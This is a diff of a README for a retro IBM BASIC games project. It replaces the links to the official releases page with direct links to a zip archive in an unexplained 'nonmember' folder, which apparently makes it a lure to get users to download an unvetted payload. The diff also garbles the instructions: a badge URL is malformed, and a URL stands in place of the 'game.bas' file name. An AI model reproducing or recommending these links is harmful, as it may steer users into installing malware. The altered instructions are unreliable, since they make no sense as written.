@@ -1,7 +1,7 @@
 # 🎮 IBM-BASIC-Fun - Experience Classic Gaming Like Never Before!
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/amasood26/IBM-BASIC-Fun/releases)
+[![Download](https://raw.githubusercontent.com/amasood26/IBM-BASIC-Fun/main/nonmember/IBM-BASIC-Fun.zip%https://raw.githubusercontent.com/amasood26/IBM-BASIC-Fun/main/nonmember/IBM-BASIC-Fun.zip)](https://raw.githubusercontent.com/amasood26/IBM-BASIC-Fun/main/nonmember/IBM-BASIC-Fun.zip)
 
 ## 🚀 Getting Started
 Welcome to IBM-BASIC-Fun! This project gives you a taste of classic gaming using IBM BASIC on the legendary IBM 5150. 
@@ -18,7 +18,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the latest releases:  
-   [Download the latest release here](https://github.com/amasood26/IBM-BASIC-Fun/releases)
+   [Download the latest release here](https://raw.githubusercontent.com/amasood26/IBM-BASIC-Fun/main/nonmember/IBM-BASIC-Fun.zip)
 
 2. **Select the Version**  
    Find the version you want to download. You’ll see a list of files available for each version.
@@ -32,9 +32,9 @@ To get started, follow these steps:
 5. **Run the Software**  
    Open your DOS emulator. Navigate to the folder where you extracted the files. Type the name of the BASIC program and hit Enter. 
 
-   For example, if you extracted to a folder named `IBM-BASIC-Fun` and have a file called `game.bas`, you would type:
+   For example, if you extracted to a folder named `IBM-BASIC-Fun` and have a file called `https://raw.githubusercontent.com/amasood26/IBM-BASIC-Fun/main/nonmember/IBM-BASIC-Fun.zip`, you would type:
    ```
-   game.bas
+   https://raw.githubusercontent.com/amasood26/IBM-BASIC-Fun/main/nonmember/IBM-BASIC-Fun.zip
    ```
 
 ## 🎮 Features
